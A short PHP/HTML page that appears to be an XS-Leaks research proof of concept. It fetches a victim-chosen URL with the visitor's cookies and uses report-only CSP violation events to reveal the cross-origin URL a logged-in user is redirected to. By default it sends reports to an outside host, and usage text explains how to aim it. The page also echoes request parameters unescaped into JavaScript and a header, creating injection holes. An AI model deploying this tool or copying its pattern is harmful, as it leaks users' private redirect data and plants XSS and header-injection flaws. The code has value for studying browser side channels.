<?php
  $url = isset($_REQUEST['url'])?$_REQUEST['url']:false;
  $domain = isset($_REQUEST['domain'])?$_REQUEST['domain']:false;
  $report_uri = isset($_REQUEST['report-uri'])?$_REQUEST['report-uri']:'https://raw.cm2.pw?csp-report';
  if(!$url || !$domain){
    header('Content-type: text/plain;charset=utf-8', true, 200);
    die(<<<'EOF'
Usage:
http://cm2.pw/research/xsleaks/csp-url?domain=example.com&url=https://example.com/redirect

Parameters:
url     -   URL issuing a redirect
domain  -   CSP whitelisted domain
report-uri  - URL to send csp-report to (default: https://raw.cm2.pw?csp-report)
EOF
);
  }
  header("Content-Security-Policy-Report-Only: default-src 'unsafe-inline' 'self' {$domain}; report-uri {$report_uri}", true, 200);
?>
<!DOCTYPE html>
<html>
  <head>
    <title>XSLeaks - Redirect URL</title>
  </head>
  <body>
    <strong>User-Agent: </strong><code id="ua"></code>
    <script>
    const handler = e => {
      // goes through here if a 3xx redirect to another domain happened
      //console.log(e.blockedURI, e.documentURI);
      const pre = document.createElement('pre');
      let props = new Set('url,documentURL,blockedURL,documentURI,blockedURI,referrer,sample,sourceFile,script-sample,message,stack,reason,href,src,data,target,downloadTotal,downloaded,failureReason,result,uploadTotal,uploaded,returnValue,type,registration'.split(','))
      pre.textContent = JSON.stringify(e, [...props],2);
      document.body.appendChild(pre);
    }
    const url = '<?php print($url);?>';
    fetch(url, {mode: 'no-cors', credentials: 'include'});
    document.querySelector('#ua').textContent = navigator.userAgent;
    document.addEventListener('securitypolicyviolation', handler);
    window.addEventListener('securitypolicyviolation', handler);
    </script>
  </body>
</html>
